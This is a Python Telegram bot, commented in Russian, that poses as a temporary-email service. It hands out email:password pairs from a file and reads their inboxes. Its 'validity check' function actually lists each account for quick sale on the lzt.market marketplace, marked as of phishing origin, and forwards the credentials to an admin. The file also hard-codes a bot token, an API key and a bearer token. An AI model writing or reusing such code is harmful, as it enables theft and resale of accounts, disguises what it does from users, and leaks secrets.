import logging
import requests
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Конфигурация
MAIL_FILE = 'mails.txt'
ADMIN_ID = 6607362264
BOT_TOKEN = "7876360553:AAHD0ZqjCQrdyzdw-d0ZV9MVE4fH70-6zFU"
FIRSTMAIL_API_KEY = "62292855-4c7b-4b3f-92e4-65be8ed20090"
LZT_API_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJzdWIiOjY5MjQ1MTEsImlzcyI6Imx6dCIsImV4cCI6MCwiaWF0IjoxNzQzNDMzNTU2LCJqdGkiOjc2MTAyMSwic2NvcGUiOiJiYXNpYyByZWFkIHBvc3QgY29udmVyc2F0ZSBwYXltZW50IGludm9pY2UgbWFya2V0In0.k2lLjLX_R90XzWEcP6Qp3EdG5smX1tyLyEJDqxsbk2At00KRUQIOY_wo0EuC6-Et5sU2d3XabOD-pwG32rnH8OvwfikC0VgoSuM5FEqDLxh8hiNtzQlW4hhI8pPsWi_8g7fUc6m34jI98ufNtUtz_Pxuoq8SU7q_Fmi8tVCfb-4"
RESET_INTERVAL = 86400

class MailService:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers = {
            "accept": "application/json",
            "X-API-KEY": FIRSTMAIL_API_KEY,
            "User-Agent": "MailBot/1.0"
        }

    def get_messages(self, email: str, password: str) -> dict:
        """Получить сообщения из почтового ящика"""
        try:
            url = f"https://api.firstmail.ltd/v1/get/messages?username={email}&password={password}"
            response = self.session.get(url, timeout=10)
            logger.info(f"API Response: {response.status_code} - {response.text[:200]}")
            
            if response.status_code == 200:
                return response.json()
            return None
        except Exception as e:
            logger.error(f"Ошибка при запросе: {str(e)}")
            return None

    def check_lzt_validity(self, email: str, password: str) -> bool:
        """Проверить валидность аккаунта через LZT.API"""
        try:
            url = "https://prod-api.lzt.market/item/fast-sell"
            params = {
                "title": "Rigichka slivaet",
                "title_en": "Rigichka slivaet",
                "price": "5555",
                "category_id": "15",
                "currency": "rub",
                "item_origin": "fishing",
                "extended_guarantee": "-1"
            }
            
            payload = {
                "login_password": f"{email}:{password}",
                "extra": {"system": "laser"}
            }
            
            headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "authorization": f"Bearer {LZT_API_TOKEN}"
            }
            
            response = requests.post(
                url,
                params=params,
                json=payload,
                headers=headers,
                timeout=10
            )
            
            logger.info(f"LZT API Response: {response.status_code} - {response.text}")
            
            # Проверяем успешность ответа
            if response.status_code == 200:
                return True
            return False
        except Exception as e:
            logger.error(f"LZT API error: {str(e)}")
            return False

class EmailBot:
    def __init__(self):
        self.mail_service = MailService()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик команды /start"""
        keyboard = [[InlineKeyboardButton("Получить почту", callback_data='get_mail')]]
        await update.message.reply_text(
            "Добро пожаловать! Нажмите кнопку, чтобы получить временную почту:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработчик всех callback-запросов"""
        query = update.callback_query
        await query.answer()
        user_data = context.user_data

        if 'emails' not in user_data:
            user_data['emails'] = []
        if 'last_reset' not in user_data:
            user_data['last_reset'] = time.time()

        if time.time() - user_data['last_reset'] > RESET_INTERVAL:
            user_data['emails'] = []
            user_data['last_reset'] = time.time()

        if query.data == 'get_mail':
            await self._handle_get_mail(query, user_data)
        elif query.data.startswith('get_code_'):
            await self._handle_get_code(query, user_data)
        elif query.data == 'get_new_mail':
            await self._handle_get_mail(query, user_data)
        elif query.data == 'confirm_change':
            await self._handle_confirm_change(query, user_data)
        elif query.data.startswith('confirm_'):
            await self._handle_final_confirm(query, user_data, context)

    async def _handle_get_mail(self, query, user_data):
        """Выдать новую почту пользователю"""
        mail = self._get_next_mail()
        if not mail:
            await query.message.reply_text("❌ Закончились доступные почты. Попробуйте позже.")
            return

        email, password = mail.split(':', 1)
        user_data['emails'].append({'email': email, 'password': password})

        keyboard = [
            [InlineKeyboardButton("🔄 Получить код", callback_data=f'get_code_{len(user_data["emails"])-1}')],
            [InlineKeyboardButton("✉️ Новая почта", callback_data='get_new_mail')],
            [InlineKeyboardButton("✅ Подтвердить почту", callback_data='confirm_change')],
        ]

        await query.message.reply_text(
            f"📧 Ваша временная почта:\n\n"
            f"Логин: <code>{email}</code>\n"
            f"Пароль: <code>{password}</code>\n\n"
            "Используйте кнопки ниже для управления:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )

    async def _handle_get_code(self, query, user_data):
        """Получить код из почты"""
        index = int(query.data.split('_')[-1])
        mail = user_data['emails'][index]
        messages = self.mail_service.get_messages(mail['email'], mail['password'])

        if not messages:
            await query.message.reply_text("❌ Не удалось получить сообщения или их нет.")
            return

        latest_msg = messages[0] if isinstance(messages, list) else messages
        text = latest_msg.get('text', latest_msg.get('body', 'Текст сообщения не найден'))

        await query.message.reply_text(
            f"📩 Последнее сообщение с {mail['email']}:\n\n{text}"
        )

    async def _handle_confirm_change(self, query, user_data):
        """Подтверждение смены почты"""
        if not user_data.get('emails'):
            await query.message.reply_text("❌ У вас нет активных почт.")
            return

        keyboard = [
            [InlineKeyboardButton(f"Подтвердить {mail['email']}", callback_data=f'confirm_{i}')]
            for i, mail in enumerate(user_data['emails'])
        ]

        await query.message.reply_text(
            "Выберите почту для подтверждения:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def _handle_final_confirm(self, query, user_data, context):
        """Финальное подтверждение почты"""
        index = int(query.data.split('_')[-1])
        mail = user_data['emails'][index]
        
        # Проверка через LZT.API
        is_valid = self.mail_service.check_lzt_validity(mail['email'], mail['password'])

        status = "✅ ВАЛИДНА" if is_valid else "❌ НЕВАЛИДНА"
        await context.bot.send_message(
            ADMIN_ID,
            f"Подтверждение почты:\n\n"
            f"Статус: {status}\n"
            f"Почта: {mail['email']}\n"
            f"Пароль: {mail['password']}\n\n"
            f"User ID: {query.from_user.id}"
        )

        await query.message.reply_text(
            f"Почта {mail['email']} {'успешно подтверждена!' if is_valid else 'не прошла проверку.'}"
        )

    def _get_next_mail(self) -> str:
        """Получить следующую почту из файла"""
        try:
            with open(MAIL_FILE, 'r+') as f:
                lines = f.readlines()
                if not lines:
                    return None
                f.seek(0)
                f.truncate()
                f.writelines(lines[1:])
            return lines[0].strip()
        except Exception as e:
            logger.error(f"Ошибка чтения файла с почтами: {str(e)}")
            return None

def main():
    """Запуск бота"""
    bot = EmailBot()
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", bot.start))
    app.add_handler(CallbackQueryHandler(bot.handle_callback))
    
    app.run_polling()

if __name__ == "__main__":
    main()